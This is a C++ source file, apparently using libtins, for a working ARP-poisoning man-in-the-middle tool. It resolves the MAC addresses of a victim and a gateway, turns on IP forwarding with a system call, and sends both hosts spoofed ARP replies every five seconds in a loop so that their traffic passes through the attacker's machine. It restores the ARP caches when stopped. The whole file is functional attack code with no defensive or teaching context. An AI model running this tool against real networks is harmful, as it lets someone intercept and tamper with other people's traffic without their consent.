#include "Mitm.hh"

Mitm::Mitm(const std::string &victimIp, const std::string &gatewayIp)
    : _iface(NetworkInterface::default_interface()), _attackerMac(_iface.addresses().hw_addr), _attackerIp(_iface.addresses().ip_addr), _run(true), _sender(new PacketSender())
{
    _gatewayIp = IPv4Address(gatewayIp);
    _gatewayMac = request(_gatewayIp);
    _victimIp = IPv4Address(victimIp);
    _victimMac = request(_victimIp);
    system("echo 1 > /proc/sys/net/ipv4/ip_forward");
    std::cout << "Start MITM : [" << _gatewayIp << "] <---> [" << _victimIp << "]" << std::endl;
}

Mitm::~Mitm(void)
{
    delete _sender;
}

// Resolve for attacker
HWAddress<6> Mitm::request(IPv4Address &targetIp)
{
    return request(targetIp, _attackerIp, _attackerMac);
}

HWAddress<6> Mitm::request(IPv4Address &targetIp, IPv4Address &senderIp, HWAddress<6> &senderMac)
{
    EthernetII      arpRequest = ARP::make_arp_request(targetIp, senderIp, senderMac);
    PDU             *response;

    if (senderIp != _attackerIp && senderMac != _attackerMac)
        _sender->send(arpRequest, _iface);
    else if ((response = _sender->send_recv(arpRequest, _iface)))
        return response->rfind_pdu<ARP>().sender_hw_addr();

    // Better to throw exception
    return HWAddress<6>("00:00:00:00:00:00");
}

/* Tell (targetIp/targetMac) that senderIp is on senderMac
 * Usually senderIp is the gateway, senderMac is the attacker and target is the victim
 */
void Mitm::reply(IPv4Address &senderIp, HWAddress<6> &senderMac, IPv4Address &targetIp, HWAddress<6> &targetMac)
{
    EthernetII      rep = ARP::make_arp_reply(targetIp, senderIp, targetMac, senderMac);

    _sender->send(rep, _iface);
}

void Mitm::start(void)
{
    std::thread     t(&Mitm::poison, this);

    t.detach();
}

void Mitm::stop()
{
    _run = false;
    system("echo 0 > /proc/sys/net/ipv4/ip_forward");
    std::cout << "Stopping MITM.." << std::endl << "Restore arp cache" << std::endl;
    for (int i = 0; i < 3; i++)
    {
        // Tell gateway thats _victimIp is _victimMac
        reply(_victimIp, _victimMac, _gatewayIp, _gatewayMac);
        // Tell victim thats _gatewayIp is _gatewayMac
        reply(_gatewayIp, _gatewayMac, _victimIp, _victimMac);
    }
}

void Mitm::poison()
{
    std::cout << "Starting arp poisoning" << std::endl;
    while (_run)
    {
        // Tell gateway thats _victimIp is _attackerMac
        reply(_victimIp, _attackerMac, _gatewayIp, _gatewayMac);
        // Tell victim thats _gatewayIp is _attackerMac
        reply(_gatewayIp, _attackerMac, _victimIp, _victimMac);
        sleep(5);
    }
}
